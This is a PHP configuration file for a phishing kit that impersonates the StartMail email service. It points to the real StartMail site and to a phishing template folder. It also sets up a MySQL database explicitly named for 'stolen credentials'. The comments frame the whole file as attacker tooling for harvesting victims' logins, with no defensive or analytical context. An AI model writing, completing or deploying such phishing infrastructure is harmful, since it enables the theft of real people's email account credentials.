<?php
# Config file for phishing with startmail (from startpage.com)

$startmail_link = "https://mail.startmail.com"; // linking
$startmail_home_page = $_SERVER['PHP_SELF']."/../../../../phishingtemplates/startmail/";

// if you want to save your stolen credentials in
// a database, set this to true (DEFAULT: false);
$use_db = false;

// mysql properties
$db_host = "localhost"; // your mysql host
$db_user = "root"; // your mysql user
$db_pass = ""; // your mysql password (DEFAULT: empty)
$db_name = "startmail_stolen_credentials"; // database name

?>
